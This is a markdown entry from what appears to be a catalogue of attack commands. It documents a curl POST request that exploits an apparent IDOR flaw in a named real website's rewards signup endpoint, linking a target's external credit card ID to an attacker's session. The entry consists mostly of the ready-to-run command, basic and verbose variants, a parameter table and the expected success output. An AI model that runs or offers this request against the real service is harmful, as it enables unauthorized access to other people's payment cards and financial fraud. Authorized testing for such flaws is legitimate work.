---
id: curl-yelp-rewards-signup-idor
data: >-
  curl -X POST 'https://www.yelp.com/rewards/signup' -H 'Cookie:
  session=attacker_session_cookie' -H 'Content-Type: application/json' -d
  '{"card_id": "target_external_card_id"}'
tags:
  - web
  - exploit
  - curl
  - idor
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:47.497Z'
verified: false
validated: true
submitted: true
---
# curl-yelp-rewards-signup

## Command

```bash
curl -X POST 'https://www.yelp.com/rewards/signup' \
  -H 'Cookie: session=attacker_session_cookie' \
  -H 'Content-Type: application/json' \
  -d '{"card_id": "target_external_card_id"}'
```

## Description

This command exploits an IDOR vulnerability by sending a manipulated POST request to Yelp's /rewards/signup endpoint to associate an external credit card identifier with the attacker's account. Use it in authenticated sessions to test for missing authorization checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `'https://www.yelp.com/rewards/signup'` | Target endpoint URL | Yes |
| `-H 'Cookie: session=...'` | Authentication session cookie | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON payload type | Yes |
| `-d '{"card_id": "..."}'` | JSON data with target card ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.yelp.com/rewards/signup' -H 'Cookie: session=abc123' -H 'Content-Type: application/json' -d '{"card_id": "external123"}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST 'https://www.yelp.com/rewards/signup' -H 'Cookie: session=abc123' -H 'Content-Type: application/json' -d '{"card_id": "external123", "other_param": "value"}'
```

## Expected Output

Successful execution returns a 200 OK response with JSON confirming card association, e.g., {"status": "success", "card_linked": true}. Failure may show 403 if controls are in place.

## Related

- [[Related Procedure: Exploit-IDOR-to-Link-External-Credit-Card]]
